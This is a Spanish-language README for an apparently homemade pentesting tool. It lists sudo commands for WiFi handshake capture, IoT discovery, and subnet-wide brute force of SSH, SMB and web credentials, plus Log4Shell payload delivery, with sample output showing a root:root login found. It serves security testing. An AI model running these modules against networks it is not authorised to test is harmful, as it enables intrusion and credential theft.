# netvulnscanner
Una herramienta de pentesting multicapa.

# 🚀 Cómo usar los nuevos módulos

Escaneo WiFi (requiere interfaz en modo monitor)
sudo python3 netvulnscanner_pro.py --wifi --interface wlan0

Detección IoT en la red local
sudo python3 netvulnscanner_pro.py --iot

Explotación en toda la subred (prueba de credenciales, SMB, SSH, Log4Shell)
sudo python3 netvulnscanner_pro.py --exploit --subnet 192.168.1.0/24

Todo junto
sudo python3 netvulnscanner_pro.py --all --interface wlan0

# 🔍 Explicación de técnicas añadidas
Módulo	Tecnología	Descripción
WiFi	airodump-ng, aireplay-ng	Escaneo de redes, captura de handshake WPA/WPA2.
IoT	UPnP/SSDP (multicast), mDNS	Detecta Chromecast, Smart TVs, routers, impresoras, etc.
SMB	impacket, scripts Nmap	Prueba credenciales por defecto y vulnerabilidades conocidas (EternalBlue, SMBGhost).
SSH/Telnet	paramiko, telnetlib	Fuerza bruta con diccionario integrado de credenciales comunes.
HTTP Auth	requests	Prueba paneles de administración con credenciales por defecto.
Log4Shell	Inyección JNDI	Envía payload en cabeceras HTTP a servicios web vulnerables.
IoT control	API específicas	Abre URLs en Chromecast, Samsung/LG TV (funcionalidad original ampliada).

# 🧪 Ejemplo de salida con los nuevos módulos

============================================================
    NETVULNSCANNER PRO - Módulos avanzados
    Uso autorizado solamente.
============================================================
[*] Escaneando WiFi en wlan0 durante 30s...
[+] Encontradas 4 redes WiFi.

Redes WiFi encontradas:
  00:11:22:33:44:55 | CH 6 | WPA2 | MiWiFi
  AA:BB:CC:DD:EE:FF | CH 1 | WPA | Vecino

¿Capturar handshake de alguna red? (s/n): s
BSSID: 00:11:22:33:44:55
Canal: 6
[*] Intentando capturar handshake para 00:11:22:33:44:55 en canal 6...
[+] Handshake capturado: /tmp/handshake_capture-01.cap

[*] Buscando dispositivos UPnP/SSDP...
[+] Encontrados 2 dispositivos UPnP.
[*] Buscando dispositivos mDNS (Bonjour)...
[+] Encontrados 1 dispositivos mDNS.

Dispositivos IoT detectados:
  192.168.1.100 - Chromecast - http://192.168.1.100:8008
  192.168.1.101 - Samsung TV - http://192.168.1.101:8001

--- Explotando 192.168.1.1 ---
[*] Probando SMB en 192.168.1.1:445
[!] 192.168.1.1:445 - smb-vuln-ms17-010 - VULNERABLE
[*] Probando SSH en 192.168.1.1:22
[+] Credenciales SSH válidas: root:root
[*] Probando Log4Shell en 192.168.1.1:80
[+] Enviado payload Log4Shell a 192.168.1.1:80
